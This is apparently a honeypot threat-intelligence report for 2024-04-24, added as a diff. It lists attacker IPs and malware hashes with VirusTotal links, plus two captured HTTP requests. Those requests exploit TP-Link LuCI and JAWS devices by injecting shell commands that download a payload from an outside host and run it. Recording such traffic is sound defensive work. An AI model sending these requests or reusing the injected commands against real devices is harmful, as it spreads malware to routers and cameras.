@@ -1,0 +1,41 @@
+Top 5 IPs for 2024-04-24 :
+
+87.179.146.211
+217.160.232.49
+218.92.247.138
+59.89.182.252
+117.204.192.37
+
+Malware Download:
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+b3d2c9d4d461b122fb049c5ef533de2e5d2352ebd41218a38cbf96a9a843e567
+https://www.virustotal.com/gui/file/b3d2c9d4d461b122fb049c5ef533de2e5d2352ebd41218a38cbf96a9a843e567
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Malcious Commands seen:
+
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F91.92.243.102%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh) HTTP/1.1
+Host: HOST IP
+User-Agent: Go-http-client/1.1
+
+Attacker source: 91.92.243.102
+
+
+GET /shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/103.163.214.97/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk HTTP/1.1
+Host: 34.205.139.202:60001
+User-Agent: Root Slut
+
+Attacker source: 45.142.182.70
+
+
+
+
+
